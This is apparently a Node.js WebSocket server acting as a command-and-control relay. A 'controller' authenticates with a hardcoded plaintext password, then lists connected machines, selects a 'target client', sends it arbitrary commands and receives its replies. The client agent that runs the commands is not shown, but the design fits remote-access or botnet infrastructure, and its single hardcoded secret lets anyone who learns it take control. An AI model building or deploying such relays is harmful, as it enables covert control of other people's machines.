const WebSocket = require("ws");

const wss = new WebSocket.Server({ port: 5009 });

const clients = new Map(); // Store clients with unique identifiers
let selectedClient = null; // Track the selected client
let controller = null;

wss.on("connection", (ws, req) => {
  const clientId = req.socket.remoteAddress + ":" + req.socket.remotePort;
  clients.set(clientId, ws);
  console.log(`✅ Client connected: ${clientId}`);

  if (controller && clients.has(controller)) {
    clients.get(controller).send(`✅ Client connected: ${clientId}`);
  }

  ws.on("message", (msg) => {
    let message = String(msg);
    console.log(`📥 Message from ${clientId}: ${message}`);

    // Authentication for controller
    if (message === "Y@to$eecjm1228!") {
      controller = clientId;
      clients.get(controller).send(`✅ You are verified as Controller`);
    }

    // If message is coming from the target client, forward it to the controller
    else if (clientId === selectedClient) {
      if (controller && clients.has(controller)) {
        clients.get(controller).send(message);
      }
    }

    // If the controller sends commands
    else if (controller === clientId) {
      if (message === "client_lists") {
        showClients();
      } else if (message.startsWith("select_client")) {
        const targetClient = message.split(" ")[1];
        selectClient(targetClient);
      } else {
        sendCommand(message);
      }
    } else ws.send("ACK");
  });

  ws.on("close", () => {
    clients.delete(clientId);
    console.log(`❌ Client disconnected: ${clientId}`);
    if (selectedClient === clientId) {
      selectedClient = null;
    }
  });
});

function showClients() {
  let msg = "\n[ CLIENT LIST ]";
  console.log(msg);
  Array.from(clients.keys()).forEach((clientId, index) => {
    console.log(`${index + 1}. ${clientId}`);
    msg += `\n${index + 1}. ${clientId}${
      clientId === controller ? "(controller)" : ""
    }`;
  });
  clients.get(controller).send(msg);
}

function selectClient(clientId) {
  if (clients.has(clientId)) {
    selectedClient = clientId;
    console.log(`✅ Client ${clientId} selected!`);
    clients.get(controller).send(`✅ Client ${clientId} selected!`);
  } else {
    console.log("❌ Client not found.");
    clients.get(controller).send("❌ Client not found.");
  }
}

function sendCommand(command) {
  if (selectedClient && clients.has(selectedClient)) {
    clients.get(selectedClient).send(command);
  } else {
    console.log("❌ No client selected or client disconnected!");
    clients
      .get(controller)
      .send("❌ No client selected or client disconnected!");
  }
}

// Command input handling (simulating server-side input)
process.stdin.on("data", (input) => {
  const command = input.toString().trim();

  if (command === "client_lists") {
    showClients();
  } else if (command.startsWith("select_client")) {
    const clientId = command.split(" ")[1];
    selectClient(clientId);
  } else {
    sendCommand(command);
  }
});

console.log("WebSocket server is listening on ws://localhost:5009");
